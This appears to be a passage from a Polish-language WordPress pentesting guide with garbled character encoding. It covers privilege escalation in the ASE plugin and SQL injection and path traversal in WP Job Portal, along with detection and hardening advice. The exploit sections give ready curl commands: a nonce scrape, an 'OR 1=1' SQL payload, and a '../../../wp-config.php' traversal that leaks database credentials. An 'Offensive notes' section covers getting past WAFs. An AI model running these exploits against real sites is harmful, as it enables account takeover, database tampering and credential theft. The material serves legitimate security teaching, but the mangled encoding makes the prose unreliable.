PrzykÅ‚ad z rzeczywistego Å›wiata znaleziono we wtyczce Admin and Site Enhancements (ASE) (â‰¤ 7.6.2.1). GaÅ‚Ä…Åº reset przywracaÅ‚a role na podstawie `reset-for=<username>` jeÅ›li nazwa uÅ¼ytkownika pojawiÅ‚a siÄ™ w wewnÄ™trznej tablicy `$options['viewing_admin_as_role_are']`, ale nie wykonywaÅ‚a ani sprawdzenia `current_user_can()` ani weryfikacji nonce przed usuniÄ™ciem obecnych rÃ³l i ponownym dodaniem zapisanych rÃ³l z user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Dlaczego to jest podatne na atak

- Polega na zaufaniu do `$_REQUEST['reset-for']` i opcji pluginu bez autoryzacji po stronie serwera.
- JeÅ›li uÅ¼ytkownik miaÅ‚ wczeÅ›niej wyÅ¼sze uprawnienia zapisane w `_asenha_view_admin_as_original_roles` i zostaÅ‚ zdegradowany, moÅ¼e je przywrÃ³ciÄ‡, odwiedzajÄ…c Å›cieÅ¼kÄ™ resetu.
- W niektÃ³rych wdroÅ¼eniach kaÅ¼dy uwierzytelniony uÅ¼ytkownik mÃ³gÅ‚ spowodowaÄ‡ reset dla innej nazwy uÅ¼ytkownika nadal obecnej w `viewing_admin_as_role_are` (bÅ‚Ä™dna autoryzacja).

Wymagania wstÄ™pne ataku

- WraÅ¼liwa wersja pluginu z wÅ‚Ä…czonÄ… funkcjÄ….
- Docelowe konto ma przestarzaÅ‚Ä… rolÄ™ o wysokich uprawnieniach zapisanÄ… w user meta z wczeÅ›niejszego uÅ¼ycia.
- Dowolna uwierzytelniona sesja; brak nonce/capability w przebiegu resetu.

Wykorzystanie (przykÅ‚ad)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Na podatnych buildach usuwa to bieÅ¼Ä…ce role i ponownie dodaje zapisane â€oryginalne roleâ€ (np. `administrator`), skutecznie eskalujÄ…c uprawnienia.

Detection checklist

- Szukaj funkcji przeÅ‚Ä…czania rÃ³l, ktÃ³re przechowujÄ… â€oryginalne roleâ€ w meta uÅ¼ytkownika (np. `_asenha_view_admin_as_original_roles`).
- Zidentyfikuj Å›cieÅ¼ki resetowania/przywracania, ktÃ³re:
- OdczytujÄ… nazwy uÅ¼ytkownikÃ³w z `$_REQUEST` / `$_GET` / `$_POST`.
- ModyfikujÄ… role za pomocÄ… `add_role()` / `remove_role()` bez `current_user_can()` i `wp_verify_nonce()` / `check_admin_referer()`.
- AutoryzujÄ… na podstawie tablicy opcji pluginu (np. `viewing_admin_as_role_are`) zamiast na podstawie uprawnieÅ„ aktora.

Hardening

- WymuÅ› sprawdzenia uprawnieÅ„ przy kaÅ¼dym odgaÅ‚Ä™zieniu zmieniajÄ…cym stan (np. `current_user_can('manage_options')` lub bardziej restrykcyjne).
- Wymagaj nonces dla wszystkich zmian rÃ³l/uprawnieÅ„ i weryfikuj je: `check_admin_referer()` / `wp_verify_nonce()`.
- Nigdy nie ufaj nazwom uÅ¼ytkownikÃ³w dostarczanym w Å¼Ä…daniu; rozstrzygaj docelowego uÅ¼ytkownika po stronie serwera na podstawie uwierzytelnionego aktora i jawnej polityki.
- UniewaÅ¼niaj stan â€oryginalnych rÃ³lâ€ przy aktualizacjach profilu/rÃ³l, aby uniknÄ…Ä‡ przywrÃ³cenia przestarzaÅ‚ych uprzywilejowaÅ„:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- RozwaÅ¼ przechowywanie minimalnego stanu i uÅ¼ywanie ograniczonych czasowo, zabezpieczonych uprawnieniami tokenÃ³w do tymczasowych przeÅ‚Ä…czeÅ„ rÃ³l.

---

### Uwagi dotyczÄ…ce WAF dla WordPress/plugin CVEs

OgÃ³lne WAFy edge/server sÄ… dostrojone do wykrywania szerokich wzorcÃ³w (SQLi, XSS, LFI). Wiele podatnoÅ›ci o duÅ¼ym wpÅ‚ywie w WordPress/plugin to bÅ‚Ä™dy logiki lub autoryzacji specyficzne dla aplikacji, ktÃ³re wyglÄ…dajÄ… jak nieszkodliwy ruch, jeÅ›li silnik nie rozumie Å›cieÅ¼ek WordPress i semantyki pluginÃ³w.

Offensive notes

- Celuj w endpointy specyficzne dla pluginÃ³w, uÅ¼ywajÄ…c czystych payloadÃ³w: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Najpierw sprawdÅº Å›cieÅ¼ki nieautoryzowane (AJAX `nopriv`, REST z permisywnym `permission_callback`, public shortcodes). DomyÅ›lne payloady czÄ™sto dziaÅ‚ajÄ… bez obfuskacji.
- Typowe przypadki o duÅ¼ym wpÅ‚ywie: eskalacja uprawnieÅ„ (broken access control), dowolne przesyÅ‚anie/pobieranie plikÃ³w, LFI, open redirect.

Defensive notes

- Nie polegaj na ogÃ³lnych sygnaturach WAF, aby chroniÄ‡ przed plugin CVEs. WdrÃ³Å¼ wirtualne poprawki na warstwie aplikacji, specyficzne dla danej podatnoÅ›ci, albo szybko aktualizuj.
- Preferuj kontrole positive-security w kodzie (capabilities, nonces, Å›cisÅ‚a walidacja wejÅ›cia) zamiast negatywnych filtrÃ³w regex.

## Ochrona WordPress

### Regularne aktualizacje

Upewnij siÄ™, Å¼e WordPress, wtyczki i motywy sÄ… aktualne. PotwierdÅº takÅ¼e, Å¼e automatyczne aktualizacje sÄ… wÅ‚Ä…czone w wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Ponadto, **instaluj tylko zaufane wtyczki i motywy WordPress**.

### Wtyczki bezpieczeÅ„stwa

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Inne zalecenia**

- UsuÅ„ domyÅ›lnego uÅ¼ytkownika **admin**
- UÅ¼ywaj **silnych haseÅ‚** i **2FA**
- Okresowo **przeglÄ…daj** **uprawnienia** uÅ¼ytkownikÃ³w
- Ogranicz **liczbÄ™ prÃ³b logowania**, aby zapobiec atakom Brute Force
- ZmieÅ„ nazwÄ™ pliku **`wp-admin.php`** i zezwÃ³l na dostÄ™p tylko wewnÄ™trznie lub z okreÅ›lonych adresÃ³w IP.


### SQL Injection bez uwierzytelnienia z powodu niewystarczajÄ…cej walidacji (WP Job Portal <= 2.3.2)

Wtyczka rekrutacyjna WP Job Portal ujawniaÅ‚a zadanie **savecategory**, ktÃ³re ostatecznie wykonuje nastÄ™pujÄ…cy podatny kod w `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemy wprowadzone przez ten fragment:

1. **Nieprzefiltrowane dane wejÅ›ciowe** â€“ `parentid` pochodzi bezpoÅ›rednio z Å¼Ä…dania HTTP.
2. **Konkatenacja Å‚aÅ„cuchÃ³w w klauzuli WHERE** â€“ brak `is_numeric()` / `esc_sql()` / prepared statement.
3. **MoÅ¼liwoÅ›Ä‡ wywoÅ‚ania bez uwierzytelnienia** â€“ chociaÅ¼ akcja jest wykonywana przez `admin-post.php`, jedynÄ… weryfikacjÄ… jest **CSRF nonce** (`wp_verify_nonce()`), ktÃ³ry kaÅ¼dy odwiedzajÄ…cy moÅ¼e pobraÄ‡ ze strony publicznej osadzajÄ…cej shortcode `[wpjobportal_my_resumes]`.

#### Eksploatacja

1. Pobierz Å›wieÅ¼y nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Wstrzyknij dowolne SQL przez naduÅ¼ycie `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
OdpowiedÅº ujawnia wynik wstrzykniÄ™tego zapytania lub modyfikuje bazÄ™ danych, potwierdzajÄ…c SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Kolejne zadanie, **downloadcustomfile**, pozwalaÅ‚o odwiedzajÄ…cym pobraÄ‡ **dowolny plik z dysku** poprzez path traversal. WraÅ¼liwy sink znajduje siÄ™ w `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` jest kontrolowany przez atakujÄ…cego i konkatenowany **bez sanitacji**. Ponownie, jedynÄ… barierÄ… jest **CSRF nonce**, ktÃ³ry moÅ¼na pobraÄ‡ ze strony z CV.

#### Eksploatacja
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Serwer zwraca zawartoÅ›Ä‡ `wp-config.php`, leaking DB credentials and auth keys.

## Referencje

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privileged-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
